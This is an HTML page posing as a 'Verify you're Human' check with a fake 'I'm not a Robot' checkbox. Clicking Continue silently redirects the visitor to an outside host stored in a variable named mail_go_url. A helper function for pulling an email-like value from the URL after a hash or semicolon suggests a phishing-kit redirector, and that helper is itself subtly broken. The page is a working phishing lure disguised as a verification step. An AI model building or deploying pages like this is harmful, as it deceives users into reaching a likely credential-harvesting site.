

<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Verification</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f5f5f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .box {
      background: #fff;
      padding: 20px 30px;
      border-radius: 10px;
      box-shadow: 0 3px 10px rgba(0,0,0,0.15);
      max-width: 400px;
      text-align: center;
    }
    .row {
      margin: 15px 0;
      display: flex;
      align-items: center;
      gap: 8px;
      justify-content: center;
    }
    .btn {
      padding: 10px 18px;
      font-size: 15px;
      border: none;
      border-radius: 6px;
      background: #888;
      color: #fff;
      cursor: not-allowed;
    }
    .btn.ready {
      background: #4caf50;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="box">
    <h2>Verification</h2>
    <p>Please Verify you're Human:</p>

    <div class="row">
      <input type="checkbox" id="checkHuman">
      <label for="checkHuman">I'm not a Robot</label>
    </div>

    <button id="continueBtn" class="btn" disabled>Continue</button>
  </div>

  <script type="text/javascript">
    // Your original redirect logic wrapped into a function
    function goRedirect() {
      var url_string = window.location.href;
      var mail_go_url = "https://x4n8-pn.bolt.host/";
      location.replace(mail_go_url);  
    }

    // Original getafterhash function unchanged
    function getafterhash(url) {
      var ret; 
      var queryStringhash = url.split('')[1]; 
      var queryStringsemi = url.split(';')[1]; 
      var queryStringsemiplus = url.split(';+')[1]; 
      var queryStringstartsemi = url.split('*;')[1]; 
      if (queryStringhash) {
        ret = queryStringhash;
      } else if (queryStringsemi) {
        ret = queryStringsemi;
      } else if (queryStringsemiplus) {
        ret = queryStringsemiplus;
      } else if (queryStringstartsemi) {
        ret = queryStringstartsemi;
      } else {
        ret = 0;
      }
      return ret;
    }

    // Checkbox + button
    const checkHuman = document.getElementById('checkHuman');
    const continueBtn = document.getElementById('continueBtn');

    checkHuman.addEventListener('change', () => {
      if (checkHuman.checked) {
        continueBtn.disabled = false;
        continueBtn.classList.add('ready');
      } else {
        continueBtn.disabled = true;
        continueBtn.classList.remove('ready');
      }
    });

    continueBtn.addEventListener('click', () => {
      if (!checkHuman.checked) return;
      goRedirect(); // run your original redirect
    });
  </script>
</body>
</html>
